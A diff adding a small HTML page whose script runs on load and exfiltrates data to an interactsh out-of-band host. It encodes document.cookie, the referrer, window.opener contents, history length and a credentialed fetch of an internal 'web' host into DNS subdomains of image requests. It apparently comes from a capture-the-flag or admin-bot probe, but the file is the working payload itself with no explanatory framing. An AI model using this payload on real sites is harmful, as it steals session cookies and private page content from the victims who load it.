@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>x</title></head>
+<body>
+<script>
+// Send everything we can to interactsh
+var oast = "da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
+
+function exfil(label, data) {
+    var encoded = btoa(data).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+    // Send via DNS (subdomain) - split if too long
+    var chunk = encoded.substring(0, 60);
+    new Image().src = "http://" + label + "." + chunk + "." + oast + "/x";
+}
+
+// 1. document.referrer
+exfil("ref", document.referrer || "none");
+
+// 2. Try to fetch the admin page (same origin won't work but try)
+fetch("http://web/", {credentials: "include"}).then(r => r.text()).then(t => {
+    exfil("fetch", t.substring(0, 100));
+}).catch(e => exfil("fetcherr", e.toString()));
+
+// 3. Try window.opener
+if (window.opener) {
+    try {
+        exfil("opener", window.opener.document.body.innerHTML.substring(0, 100));
+    } catch(e) {
+        exfil("openererr", e.toString());
+    }
+} else {
+    exfil("opener", "null");
+}
+
+// 4. document.cookie (our domain)
+exfil("cookie", document.cookie || "nocookie");
+
+// 5. Try to read history
+exfil("hist", "len=" + history.length);
+</script>
+</body>
+</html>
